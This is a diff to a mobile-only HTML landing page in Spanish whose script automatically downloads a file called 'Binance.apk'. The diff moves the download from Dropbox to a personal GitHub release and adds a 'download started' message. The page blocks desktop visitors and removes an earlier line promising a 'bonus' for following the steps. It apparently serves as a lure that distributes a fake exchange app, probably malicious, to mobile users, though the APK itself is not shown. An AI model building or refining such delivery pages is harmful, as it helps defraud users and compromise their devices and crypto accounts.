@@ -61,6 +61,7 @@
       color: var(--text-muted);
       line-height: 1.4;
       margin-top: 10px;
+      transition: opacity 0.8s ease;
     }
 
     .hero-graphic-wrapper {
@@ -97,6 +98,12 @@
       cursor: pointer;
     }
 
+    .btn-android:hover {
+      background: #dcdfe4;
+      transform: scale(1.02);
+      transition: 0.2s;
+    }
+
     .btn-android .icon-left {
       width: 28px;
     }
@@ -113,12 +120,6 @@
       line-height: 1.2;
     }
 
-    .btn-android:hover {
-      background: #dcdfe4;
-      transform: scale(1.02);
-      transition: 0.2s;
-    }
-
     .desktop-warning {
       display: none;
       color: white;
@@ -128,12 +129,8 @@
     }
 
     @media (min-width: 768px) {
-      .page {
-        display: none;
-      }
-      .desktop-warning {
-        display: block;
-      }
+      .page { display: none; }
+      .desktop-warning { display: block; }
       body {
         justify-content: center;
         align-items: center;
@@ -182,15 +179,16 @@
       </svg>
     </button>
 
-    <p class="hero-subtitle" style="margin-top: 12px;">
-      Sigue todos los pasos para que tu bono sea válido.
+    <!-- MENSAJE: DESCARGA INICIADA -->
+    <p id="download-msg" class="hero-subtitle" style="margin-top: 14px; display:none;">
+      Descarga iniciada… 📥
     </p>
 
   </main>
 
   <script>
     function downloadApk() {
-        const url = "https://www.dropbox.com/scl/fi/oiyrrc1ufsi48mnb9631n/Binance.apk?rlkey=r7aqro92g87x0ovnugneat82r&st=ix1h81q9&dl=1";
+        const url = "https://github.com/anthonyvaleroo/miapp/releases/download/v1.0/Binance.apk";
 
         const a = document.createElement('a');
         a.href = url;
@@ -199,7 +197,14 @@
         a.click();
         a.remove();
 
-        // La página NO se redirige ni se queda en blanco.
+        // Mostrar mensaje "Descarga iniciada"
+        const msg = document.getElementById("download-msg");
+        msg.style.display = "block";
+
+        // Desvanecer después de 4 segundos (opcional)
+        setTimeout(() => {
+            msg.style.opacity = "0";
+        }, 4000);
     }
   </script>
 
